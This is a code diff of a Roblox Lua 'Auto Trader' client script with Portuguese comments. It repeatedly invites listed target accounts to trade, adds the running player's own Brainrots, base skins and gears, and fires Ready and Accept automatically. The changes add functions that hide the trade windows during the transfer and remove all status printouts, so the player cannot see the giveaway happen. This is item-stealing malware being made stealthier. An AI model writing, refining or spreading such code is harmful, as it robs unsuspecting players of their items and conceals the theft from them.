@@ -59,23 +59,8 @@ local function getData()
     return (ok and data) or nil
 end
 
--- Remove UI da trade
-local function clearEffects()
-    for _, v in ipairs(Lighting:GetChildren()) do
-        if v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
-            pcall(function() v:Destroy() end)
-        end
-    end
-
-    local cam = workspace:FindFirstChild("Camera")
-    if cam then
-        for _, v in ipairs(cam:GetChildren()) do
-            if v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
-                pcall(function() v:Destroy() end)
-            end
-        end
-    end
-
+-- Oculta a GUI de trade completamente enquanto funciona
+local function hideTradeUI()
     for _, guiName in ipairs({"TradeLiveTrade", "TradePrompts", "TradePlayerList"}) do
         local gui = PlayerGui:FindFirstChild(guiName)
         if gui then
@@ -84,21 +69,27 @@ local function clearEffects()
     end
 end
 
-task.spawn(function()
-    while true do
-        clearEffects()
-        task.wait(0.25)
+-- Mostra a GUI de trade novamente
+local function showTradeUI()
+    for _, guiName in ipairs({"TradeLiveTrade", "TradePrompts", "TradePlayerList"}) do
+        local gui = PlayerGui:FindFirstChild(guiName)
+        if gui then
+            gui.Enabled = true
+        end
     end
-end)
+end
 
-workspace.DescendantAdded:Connect(function(d)
-    if d:IsA("BlurEffect") or d:IsA("DepthOfFieldEffect") then
-        pcall(function() d:Destroy() end)
-    end
-end)
+-- Checa se está em trade
+local function isInTrade()
+    local pdata = getData()
+    if not pdata then return false end
+    
+    local tradeData = pdata:Get("active")
+    return tradeData ~= nil and tradeData ~= false
+end
 
 TradeCompleted.OnClientEvent:Connect(function()
-    print("✅ Trade completa!")
+    showTradeUI()
     tradeActive = false
     tradeAddDone = false
     for _, t in ipairs(targets) do
@@ -253,66 +244,51 @@ local function doTradeActions()
     if tradeAddDone then return end
     tradeAddDone = true
 
-    print("🚀 Iniciando adição de items...")
-    task.wait(1.5)
+    task.wait(1)
+    hideTradeUI()
 
-    -- Adiciona Brainrots - CORRIGIDO
+    -- Adiciona Brainrots
     local brainrots = getBrainrots()
-    print("📊 Total de Brainrots: " .. #brainrots)
     
     for _, br in ipairs(brainrots) do
         if NORMAL_BRAINROTS[br.name] then
-            print("🧠 Adicionando Brainrot: " .. br.name .. " (slot: " .. br.slot .. ")")
             pcall(function()
-                -- Passa apenas: GUID, slot, e toda a data do brainrot
-                local result = AddBrainrot:InvokeServer(ADD_BRAINROT_GUID, br.slot, br.data)
-                print("✅ Resultado: " .. tostring(result))
+                AddBrainrot:InvokeServer(ADD_BRAINROT_GUID, br.slot, br.data)
             end)
             task.wait(0.8)
         end
     end
 
-    -- Adiciona Base Skins - CORRIGIDO
+    -- Adiciona Base Skins
     local skins = getBaseSkins()
-    print("📊 Total de Base Skins: " .. #skins)
     
     for _, skin in ipairs(skins) do
         if NORMAL_BASE_SKINS[skin.SkinName] then
-            print("🏠 Adicionando Base Skin: " .. skin.SkinName)
             pcall(function()
-                -- Passa: GUID, tipo "BaseSkin", UUID, e SkinName
-                local result = AddItem:InvokeServer(ADD_ITEM_GUID, "BaseSkin", skin.UUID, skin.SkinName)
-                print("✅ Resultado: " .. tostring(result))
+                AddItem:InvokeServer(ADD_ITEM_GUID, "BaseSkin", skin.UUID, skin.SkinName)
             end)
             task.wait(0.8)
         end
     end
 
-    -- Adiciona Gears - CORRIGIDO
+    -- Adiciona Gears
     local gears = getGears()
-    print("📊 Total de Gears: " .. #gears)
     
     for _, gear in ipairs(gears) do
         if NORMAL_GEARS[gear.GearName] then
-            print("⚙️ Adicionando Gear: " .. gear.GearName)
             pcall(function()
-                -- Passa: GUID, tipo "Gear", UUID, e GearName
-                local result = AddItem:InvokeServer(ADD_ITEM_GUID, "Gear", gear.UUID, gear.GearName)
-                print("✅ Resultado: " .. tostring(result))
+                AddItem:InvokeServer(ADD_ITEM_GUID, "Gear", gear.UUID, gear.GearName)
             end)
             task.wait(0.8)
         end
     end
 
-    print("⏳ Aguardando antes de Ready...")
     task.wait(2)
     
-    print("🟢 Enviando Ready...")
     pcall(function() Ready:FireServer(READY_GUID) end)
     
     task.wait(1.5)
     
-    print("✅ Enviando Accept...")
     pcall(function() Accept:FireServer(ACCEPT_GUID) end)
 end
 
@@ -320,22 +296,18 @@ end
 task.spawn(function()
     while true do
         hasWantedItems = checkHasWantedItems()
-        print("🔍 Verificando items... hasWantedItems: " .. tostring(hasWantedItems))
 
-        if hasWantedItems then
+        if hasWantedItems and not isInTrade() then
             for _, t in ipairs(targets) do
-                if not cooldown[t.id] and not tradeActive then
-                    print("📩 Tentando convidar: " .. t.name .. " (ID: " .. t.id .. ")")
+                if not cooldown[t.id] and not tradeActive and not isInTrade() then
                     local ok = pcall(function()
                         Invite:InvokeServer(INVITE_GUID, t.id)
                     end)
                     if ok then
-                        print("✅ Convite enviado!")
                         tradeActive = true
                         tradeAddDone = false
                         task.spawn(doTradeActions)
                     else
-                        print("❌ Falha ao enviar convite")
                         tradeActive = false
                     end
                 end
@@ -346,6 +318,3 @@ task.spawn(function()
         end
     end
 end)
-
-print("🚀 Auto Trader iniciado!")
-
